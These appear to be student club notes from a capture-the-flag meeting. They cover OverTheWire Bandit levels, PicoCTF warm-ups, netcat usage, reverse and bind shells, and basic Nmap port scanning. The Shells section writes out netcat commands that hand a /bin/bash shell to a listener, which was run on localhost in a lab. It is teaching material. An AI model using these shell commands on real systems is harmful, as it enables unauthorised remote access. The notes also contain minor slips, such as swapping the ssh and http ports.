## CTF Meeting 2-2-22 Overview

- Started out with Bandit level 7

- Utilized commands such as `grep` and `cat` when accessing data.txt file

- `grep millionth data.txt -A 5 -B 5`

- located 'millionth' string within data.txt, to find the password

- On bandit level 8, we used `head data.txt` to get the heading part of the catted text contained in *data.txt*.

https://i.imgur.com/6vGceyD.png

- we used `sort` command to find unique instances of strings within data.txt using `uniq -u` to only print unique lines.

## Bandit 9

- `Strings` command is used to discern what files are readable within a certain file.
- For example: `strings data.txt | grep "====="`
will read all readable strings within *data.txt* and pipe them to a line after ====.

## PicoCTF Practices


- We did 'Let's Warm up' last week.

- Waseem was explaining hexadecimal format; hexadecimal is basically a step up from binary in terms of human-readability.

- How do we translate 0x70 (hexadecimal) to ASCII?
  - Easiest way is to go to a tool **Cyberchef** and input 0x70 to have it converted to ASCII.

- Cyberchef will output 0x70 as 'p' in ASCII.

- 'Nice Netcat' is another good introduction to PicoCTF.
   - running the specified command gives us output that is obviously not in english. What should we do?
   - Run Cyberchef. we can see that this will output the CTF flag after cyberchef converts the ASCII gibberish.

- WE very importantly learned that you say you 'PWNED' someone whenever you deface their webpage/architecture. Word.

- Waseem bragged about his ability to automate a challenge.

## Netcat 

- **Netcat** will be used so many times. 

- 'Listen Mode' in netcat is imperative to know about.
   - nc-l    (listen)
   - nc -v     (verbose)
   - nc -n         (no domain name (suggests to use an IP))
   - nc -p         (port)

- Let's combine all this parameters: `nc -nvlp`

- Woah, if we combine all those flags in netcat we get a command that will listen to connections only from IPs, and will require a port, and will output details in verbose mode.

## Shells

### Reverse Shells

- The idea of a reverse shell is to use a victim's host machine to allow incoming connections.
- You setup a listener on your machine:
   - nc -e /bin/bash your_ip your_port   (this was run on one of the terminal instances on RedHat machines in the computer lab)
   - nc -nvlp your_port     (this is the listener, we set this up on another terminal instance on the RedHat machines.)
Hint: you can use `ip a` to locate your IP address

How this looked in class:

Listener: `nc -nvlp 4444`

Connection: `nc 127.0.0.1 4444 -e /bin/bash`

After doing this, the listener can use `whoami` to find details about the connection-hosting machine.

### Bind Shells

- These shells exist forever until someone connects. Anyone can connect, as opposed to reverse shells.
- Bind shells work by creating a listener, like before.
   - nc -nvlp 4444 -e /bin/bash

- After doing this, one of the machine (the host) will be listening: `Listening on [any] 444 ...`
- Then we need to setup a connection instance with a host machine(we had used our ubuntu machine to connect to the host):
  - nc -v 127.0.0.1 4444

After this, on the ubuntu machine we're using to connect, we should see `localhost [127.0.0.1] 4444 (?) open` 

## Intro to NMap

- **Nmap** is basically a tool that lets you scan ports on a machine, or many machines.
- Allows us to see what doors a machine has open. 
- As a blueteamer or pentester, you need to know what services are running on a machine, be it Linux or Windows.

- Nmap is commonly used by security analysts and hackers alike.

- We did some practice with NMap: 
   - First we needed to update our Ubuntu machines, and install Nmap:
   
   `sudo apt full-upgrade`     (apt is the package manager that Debian uses)
   `sudo apt update && sudo apt dist-upgrade -y`
   - After issuing these two commands in our terminal, our machine should be fully prepped for nmap sickness.
- Installing nmap:
   - `sudo apt install nmap -y`

- Using Nmap:
- `nmap -h` will bring up the 'help' list of commands for nmap.

- But before this, we had a scuffed demonstration of how TCP works. 
- **SYN/ACK** means TCP says yes.
TCP basically asks if it can connect, given the existence of a certain port.

- UDP does not ask questions.

https://i.imgur.com/vlZAnw9.png

- Nmap usage:
   - `nmap -v 10.226.19.219 -p80,22` 
   Here we are specifically scanning the above ip address under ports 80 and 22, which correspond to **ssh** and **http** services.







